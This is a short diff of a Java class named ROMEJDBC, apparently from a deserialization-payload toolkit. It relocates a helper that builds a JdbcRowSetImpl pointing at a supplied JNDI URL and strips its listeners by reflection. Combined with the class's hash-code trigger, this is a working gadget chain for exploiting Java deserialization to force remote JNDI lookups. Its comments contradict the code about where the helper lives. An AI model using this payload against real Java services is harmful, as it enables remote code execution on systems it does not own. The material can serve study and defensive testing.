@@ -7,6 +7,15 @@ import com.sun.rowset.JdbcRowSetImpl;
 
 
 public class ROMEJDBC implements ObjectPayload<Object> {
+    // Assuming JDKUtil class with makeJNDIRowSet method
+    public static JdbcRowSetImpl makeJNDIRowSet(String jndiUrl) throws Exception {
+        JdbcRowSetImpl rs = new JdbcRowSetImpl();
+        rs.setDataSourceName(jndiUrl);
+        rs.setMatchColumn("foo");
+        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
+        return rs;
+    }
+
     @Override
     public Object getObject(String command) throws Exception {
         // Assuming makeJNDIRowSet is a static method in JDKUtil
@@ -21,15 +30,6 @@ public class ROMEJDBC implements ObjectPayload<Object> {
 
     public Object makeHashCodeTrigger(Object o1) throws Exception {
         return JDKUtil.makeMap(o1, o1); // Assuming JDKUtil.makeMap returns a Map or similar object
-    }
-
-    // Assuming JDKUtil class with makeJNDIRowSet method
-    public static JdbcRowSetImpl makeJNDIRowSet(String jndiUrl) throws Exception {
-        JdbcRowSetImpl rs = new JdbcRowSetImpl();
-        rs.setDataSourceName(jndiUrl);
-        rs.setMatchColumn("foo");
-        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
-        return rs;
     }
 
 }
